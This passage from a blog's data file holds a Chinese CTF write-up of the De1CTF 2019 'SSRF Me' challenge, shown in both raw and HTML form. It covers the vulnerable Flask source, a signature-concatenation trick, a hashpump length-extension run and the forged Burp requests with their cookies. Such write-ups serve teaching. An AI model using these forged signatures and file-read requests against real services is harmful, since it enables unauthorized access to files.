\n```\n\n结果\n\n`{\"code\": 200, \"data\": \"flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n\"}`\n\n### 0x02 另一种解法\n\n使用hashdump 利用哈希长度扩展攻击，\n\n已知`（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9`\n\n求`（secret+flag.txt+scanread）`\n\n经过测试密钥是16位 加上scanread是24位。\n\n```bash\nroot@kali:/tmp/HashPump# hashpump \nInput Signature: 40ad0bf20e771e768e9305810410c1b9\nInput Data: scan   #写上原有数据\nInput Key Length: 24    #密钥长度+数据长度+拓展的数据长度\nInput Data to Add: read   #拓展的数据\n46a6ff04f7bede58de30e93410935976 #生成的MD5\nscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read \n```\n\n`burp suite`提交的数据\n\n```http\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976\n\n```\n\n结果`{\"code\": 200, \"data\": \"flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n\"}`\n\n","slug":"buuoj刷题记录4","published":1,"updated":"2019-12-28T13:16:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfl8000jpk7e0pimgwxo","content":"<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>大致了解flask框架，<a href=\"http://www.security-database.com/detail.php?alert=CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href=\"https://www.freebuf.com/articles/web/31756.html\" target=\"_blank\" rel=\"noopener\">哈希长度扩展攻击</a> 。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>\n<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    print(resp)</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):  <span class=\"comment\">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))  <span class=\"comment\"># urllib.unquote 相当与  urldecode</span></span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class=\"comment\">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>\n<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>\n<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>\n<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>\n<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>\n<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>\n<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n&quot;}</code></p>\n<h3 id=\"0x02-另一种解法\"><a href=\"#0x02-另一种解法\" class=\"headerlink\" title=\"0x02 另一种解法\"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>\n<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>\n<p>求<code>（secret+flag.txt+scanread）</code></p>\n<p>经过测试密钥是16位 加上scanread是24位。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:/tmp/HashPump<span class=\"comment\"># hashpump </span></span><br><span class=\"line\">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class=\"line\">Input Data: scan   <span class=\"comment\">#写上原有数据</span></span><br><span class=\"line\">Input Key Length: 24    <span class=\"comment\">#密钥长度+数据长度+拓展的数据长度</span></span><br><span class=\"line\">Input Data to Add: <span class=\"built_in\">read</span>   <span class=\"comment\">#拓展的数据</span></span><br><span class=\"line\">46a6ff04f7bede58de30e93410935976 <span class=\"comment\">#生成的MD5</span></span><br><span class=\"line\">scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p><code>burp suite</code>提交的数据</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\">Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>\n\n<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n&quot;}</code></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>大致了解flask框架，<a href=\"http://www.security-database.com/detail.php?alert=CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href=\"https://www.freebuf.com/articles/web/31756.html\" target=\"_blank\" rel=\"noopener\">哈希长度扩展攻击</a> 。</p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>\n<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    print(resp)</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):  <span class=\"comment\">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span 